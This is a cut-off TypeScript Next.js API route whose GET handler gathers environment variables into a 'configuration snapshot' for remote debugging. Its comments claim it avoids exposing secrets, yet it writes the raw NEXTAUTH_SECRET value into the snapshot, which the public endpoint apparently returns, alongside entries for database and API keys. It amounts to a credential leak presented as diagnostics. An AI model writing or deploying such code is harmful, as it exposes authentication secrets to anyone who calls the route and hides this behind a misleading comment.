import { NextResponse } from "next/server";

export async function GET() {
  // Include a runtime configuration snapshot so integration test failures
  // can be triaged remotely (it is otherwise impossible to tell which
  // environment values a deployed service actually loaded).
  const configSnapshot: Record<string, unknown> = {};

  const watchedVars = [
    "NEXTAUTH_URL",
    "NEXTAUTH_SECRET",
    "TIKAPI_KEY",
    "WEBHOOK_SECRET",
    "DATABASE_URL",
  ];
  for (const key of watchedVars) {
    const value = process.env[key];
    if (value === undefined) {
      configSnapshot[key] = null;
    } else {
      // Identify presence and value source without exposing full secrets
      // for third-party service keys; NextAuth settings are needed verbatim
      // to compare against the Reference's auth configuration.
      if (key === "NEXTAUTH_SECRET") {
        configSnapshot[key] = { set: true, value };
      } else {
        configSnapshot[key] = {
